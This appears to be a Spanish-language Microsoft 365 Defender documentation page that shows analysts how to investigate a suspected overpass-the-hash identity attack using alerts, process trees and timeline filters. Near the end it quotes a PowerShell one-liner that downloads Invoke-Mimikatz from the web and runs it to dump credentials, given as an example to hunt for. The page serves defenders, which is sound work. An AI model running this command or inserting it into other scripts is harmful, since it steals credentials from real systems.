---
title: Ejemplo de un ataque basado en identidad
description: Realice un análisis de ejemplo de un ataque basado en identidad.
keywords: incidentes, alertas, investigación, correlación, ataque, máquinas, dispositivos, usuarios, identidades, identidad, buzón de correo electrónico, 365, microsoft, m365, respuesta a incidentes, ciberataque
search.product: eADQiWindows 10XVcnh
ms.service: microsoft-365-security
ms.subservice: m365d
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dansimp
author: dansimp
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- m365-security
- m365solution-firstincident
- highpri
- tier1
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.openlocfilehash: ffdc0e6731ae610a1a2184c6b7b5523dd1a73afa
ms.sourcegitcommit: 12af9e8e3a6eaa090fda9e98ccb831dff65863a4
ms.translationtype: MT
ms.contentlocale: es-ES
ms.lasthandoff: 09/27/2022
ms.locfileid: "68048888"
---
# <a name="example-of-an-identity-based-attack"></a>Ejemplo de un ataque basado en identidad

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

**Se aplica a:**
- Microsoft 365 Defender

Microsoft Defender for Identity puede ayudar a detectar intentos malintencionados de poner en peligro las identidades de su organización. Dado que Defender for Identity se integra con Microsoft 365 Defender, los analistas de seguridad pueden tener visibilidad sobre las amenazas procedentes de Defender for Identity, como sospechas de intentos de elevación de privilegios de Netlogon.

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a>Análisis del ataque en Microsoft Defender for Identity

Microsoft 365 Defender permite a los analistas filtrar las alertas por origen de detección en la pestaña **Alertas** de la página incidentes. En el ejemplo siguiente, el origen de detección se filtra a **Defender for Identity**. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="Filtrado del origen de detección en Microsoft Defender for Identity" lightbox="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png":::

La selección de la alerta de ataque sospechoso de **sobrepase el hash** va a una página de Microsoft Defender for Cloud Apps que muestra información más detallada. Para obtener más información sobre una alerta o un ataque, seleccione **Más información sobre este tipo de alerta** para leer una [descripción de las sugerencias de ataque](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) y corrección.
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="Una alerta de ataque de overpass-the-hash sospechosa" lightbox="../../media/first-incident-path-identity/first-incident-identity-alert-example.png"::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a>Investigar el mismo ataque en Microsoft Defender para punto de conexión

Como alternativa, un analista puede usar Defender para punto de conexión para obtener más información sobre la actividad en un punto de conexión. Seleccione el incidente en la cola de incidentes y, a continuación, seleccione la pestaña **Alertas** . Desde aquí, también pueden identificar el origen de detección. Un origen de detección etiquetado como EDR significa Detección y respuesta de puntos de conexión, que es Defender para punto de conexión. Desde aquí, el analista selecciona una alerta detectada por EDR.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Detección y respuesta de puntos de conexión en el portal de Microsoft Defender para punto de conexión" lightbox="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png":::

En la página de alerta se muestra información pertinente, como el nombre del dispositivo afectado, el nombre de usuario, el estado de la investigación automática y los detalles de la alerta. En el artículo de alerta se muestra una representación visual del árbol de procesos. El árbol de procesos es una representación jerárquica de los procesos primarios y secundarios relacionados con la alerta.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Un árbol de proceso de alertas en el Microsoft Defender para punto de conexión" lightbox="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png"::: 

Cada proceso se puede expandir para ver más detalles. Los detalles que puede ver un analista son los comandos reales que se especificaron como parte de un script malintencionado, direcciones IP de conexión salientes y otra información útil.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Detalles del proceso en el portal de Microsoft Defender para punto de conexión" lightbox="../../media/first-incident-path-identity/first-incident-identity-process-details.png":::
 
Al seleccionar **Ver en la escala de tiempo**, un analista puede explorar en profundidad aún más para determinar la hora exacta del compromiso. 

Microsoft Defender para punto de conexión puede detectar muchos archivos y scripts malintencionados. Sin embargo, debido a muchos usos legítimos para las conexiones salientes, PowerShell y la actividad de línea de comandos, algunas actividades se considerarían benignas hasta que se crea un archivo o actividad malintencionados. Por lo tanto, el uso de la escala de tiempo ayuda a los analistas a poner la alerta en contexto con la actividad circundante para determinar el origen original o la hora del ataque que, de lo contrario, está oculto por la actividad común del usuario y el sistema de archivos. 

Para usar la escala de tiempo, un analista comenzaría en el momento de la detección de alertas (en rojo) y se desplazaría hacia abajo hacia atrás a tiempo para determinar cuándo se inició realmente la actividad original que condujo a la actividad malintencionada. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="Hora de inicio del analista para la detección de alertas" lightbox="../../media/first-incident-path-identity/first-incident-identity-start-time.png"::: 

Es importante comprender y distinguir la actividad común, como las conexiones Windows Update, el tráfico de activación de Software de confianza de Windows, otras conexiones comunes a sitios de Microsoft, actividad de Internet de terceros, actividad de punto de conexión de Microsoft Configuration Manager y otra actividad benigna de actividad sospechosa. Una manera de distinguir es mediante el uso de filtros de escala de tiempo. Hay muchos filtros que pueden resaltar una actividad específica al filtrar todo lo que el analista no quiere ver. 

En la imagen siguiente, el analista filtró para ver solo los eventos de red y proceso. Este criterio de filtro permite al analista ver las conexiones de red y los procesos que rodean el evento en el que el Bloc de notas estableció una conexión con una dirección IP, que también vimos en el árbol de procesos. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="Cómo se usó el Bloc de notas para realizar una conexión saliente malintencionada" lightbox="../../media/first-incident-path-identity/first-incident-identity-notepad.png"::: 

En este evento concreto, el Bloc de notas se usó para realizar una conexión saliente malintencionada. Sin embargo, a menudo los atacantes usarán iexplorer.exe para establecer conexiones para descargar una carga malintencionada, ya que normalmente iexplorer.exe procesos se consideran actividad normal del explorador web.

Otro elemento que se debe buscar en la escala de tiempo sería los usos de PowerShell para las conexiones salientes. El analista buscaría conexiones correctas de PowerShell con comandos como `IEX (New-Object Net.Webclient)` seguidos de una conexión saliente a un sitio web que hospeda un archivo malintencionado. 

En el ejemplo siguiente, PowerShell se usó para descargar y ejecutar Mimikatz desde un sitio web:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
Un analista puede buscar rápidamente palabras clave escribiendo la palabra clave en la barra de búsqueda para mostrar solo los eventos creados con PowerShell. 

## <a name="next-step"></a>Paso siguiente

Consulte la ruta de acceso de investigación de [suplantación de identidad (phishing](first-incident-path-phishing.md) ).

## <a name="see-also"></a>Vea también

- [Información general sobre incidentes](incidents-overview.md)
- [Administrar incidentes](manage-incidents.md)
- [Investigar incidentes](investigate-incidents.md)
